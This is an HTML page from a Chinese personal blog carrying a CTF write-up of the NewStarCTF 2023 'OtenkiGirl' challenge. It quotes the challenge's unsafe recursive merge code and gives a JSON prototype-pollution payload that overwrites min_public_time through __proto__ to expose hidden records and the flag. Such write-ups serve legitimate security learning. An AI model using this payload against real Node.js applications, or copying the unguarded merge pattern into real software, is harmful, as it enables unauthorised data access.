@@ -1,0 +1,290 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JavaScript原型链污染 | NaCl1</title>
+<link rel="shortcut icon" href="https://NaCl1.github.io/favicon.ico?v=1704386016631">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://NaCl1.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="JavaScript原型链污染 | NaCl1 - Atom Feed" href="https://NaCl1.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="关于js原型链: https://www.yuque.com/cnily03/tech/js-prototype-pollution
+buu NewStarCTF 2023 week3 OtenkiGirl
+主要审计附件中 info.js和..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://NaCl1.github.io">
+  <img class="avatar" src="https://NaCl1.github.io/images/avatar.png?v=1704386016631" alt="">
+  </a>
+  <h1 class="site-title">
+    NaCl1
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JavaScript原型链污染
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-02
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p><strong>关于js原型链</strong>: https://www.yuque.com/cnily03/tech/js-prototype-pollution</p>
+<h1 id="buu-newstarctf-2023-week3-otenkigirl">buu NewStarCTF 2023 week3 OtenkiGirl</h1>
+<p>主要审计附件中 info.js和submit.js<br>
+submit用于提交表单,而info用于获取提交后的数据</p>
+<p>submit.js部分代码:</p>
+<pre><code class="language-js">const merge = (dst, src) =&gt; {
+    if (typeof dst !== &quot;object&quot; || typeof src !== &quot;object&quot;) return dst;
+    for (let key in src) {
+        if (key in dst &amp;&amp; key in src) {
+            dst[key] = merge(dst[key], src[key]);
+        } else {
+            dst[key] = src[key];
+        }
+    }
+    return dst;
+}
+
+router.post(&quot;/submit&quot;, async (ctx) =&gt; {
+    if (ctx.header[&quot;content-type&quot;] !== &quot;application/json&quot;)
+        return ctx.body = {
+            status: &quot;error&quot;,
+            msg: &quot;Content-Type must be application/json&quot;
+        }
+
+    const jsonText = ctx.request.rawBody || &quot;{}&quot;
+    try {
+        const data = JSON.parse(jsonText);
+        if (typeof data[&quot;contact&quot;] !== &quot;string&quot; || typeof data[&quot;reason&quot;] !== &quot;string&quot;)
+            return ctx.body = {
+                status: &quot;error&quot;,
+                msg: &quot;Invalid parameter&quot;
+            }
+        if (data[&quot;contact&quot;].length &lt;= 0 || data[&quot;reason&quot;].length &lt;= 0)
+            return ctx.body = {
+                status: &quot;error&quot;,
+                msg: &quot;Parameters contact and reason cannot be empty&quot;
+            }
+
+        const DEFAULT = {
+            date: &quot;unknown&quot;,
+            place: &quot;unknown&quot;
+        }
+        const result = await insert2db(merge(DEFAULT, data));
+        ctx.body = {
+            status: &quot;success&quot;,
+            data: result
+        };
+    } catch (e) {
+        console.error(e);
+        ctx.body = {
+            status: &quot;error&quot;,
+            msg: &quot;Internal Server Error&quot;
+        }
+    }
+})
+</code></pre>
+<p>info.js部分代码</p>
+<pre><code class="language-js">async function getInfo(timestamp) {
+    timestamp = typeof timestamp === &quot;number&quot; ? timestamp : Date.now();
+    // Remove test data from before the movie was released
+    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
+   // DEFAULT_CONFIG
+    timestamp = Math.max(timestamp, minTimestamp);
+    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`, [timestamp]).catch(e =&gt; { throw e });
+    return data;
+}
+
+router.post(&quot;/info/:ts?&quot;, async (ctx) =&gt; {
+    if (ctx.header[&quot;content-type&quot;] !== &quot;application/x-www-form-urlencoded&quot;)
+        return ctx.body = {
+            status: &quot;error&quot;,
+            msg: &quot;Content-Type must be application/x-www-form-urlencoded&quot;
+        }
+    if (typeof ctx.params.ts === &quot;undefined&quot;) ctx.params.ts = 0
+    const timestamp = /^[0-9]+$/.test(ctx.params.ts || &quot;&quot;) ? Number(ctx.params.ts) : ctx.params.ts;
+    if (typeof timestamp !== &quot;number&quot;)
+        return ctx.body = {
+            status: &quot;error&quot;,
+            msg: &quot;Invalid parameter ts&quot;
+        }
+
+    try {
+        const data = await getInfo(timestamp).catch(e =&gt; { throw e });
+        ctx.body = {
+            status: &quot;success&quot;,
+            data: data
+        }
+    } catch (e) {
+        console.error(e);
+        return ctx.body = {
+            status: &quot;error&quot;,
+            msg: &quot;Internal Server Error&quot;
+        }
+    }
+})
+</code></pre>
+<p>info.js中的merge函数存在原型链污染漏洞</p>
+<pre><code class="language-js">dst[key] = src[key];
+</code></pre>
+<p><strong>注:</strong> 在submit.js中</p>
+<pre><code class="language-js">const data = JSON.parse(jsonText);
+</code></pre>
+<p>这会使data的___proto___指向Object.prototype</p>
+<blockquote>
+<p>根据JavaScript的语言规范，通过JSON.parse()方法创建的对象的原型是Object.prototype<br>
+在config.default.js中,可以发现我们需要污染的min_public_time正是在Object类下,即min_public_time定义在Object.prototype中</p>
+</blockquote>
+<h3 id="构造污染paylopad">构造污染paylopad:</h3>
+<pre><code class="language-json">{&quot;date&quot;:&quot;111&quot;,&quot;place&quot;:&quot;222&quot;,&quot;contact&quot;:&quot;333&quot;,&quot;reason&quot;:&quot;111&quot;,
+&quot;__proto__&quot;:{
+&quot;min_public_time&quot;: &quot;1001-01-01&quot;
+},
+&quot;timestamp&quot;:1701522611184}
+</code></pre>
+<p>提交后访问/info/0即可得到flag<br>
+<strong>太难了555 qwq</strong></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#buu-newstarctf-2023-week3-otenkigirl">buu NewStarCTF 2023 week3 OtenkiGirl</a><br>
+*
+<ul>
+<li><a href="#%E6%9E%84%E9%80%A0%E6%B1%A1%E6%9F%93paylopad">构造污染paylopad:</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://NaCl1.github.io/post/sqli-labs/">
+              <h3 class="post-title">
+                sqli-labs
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://NaCl1.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
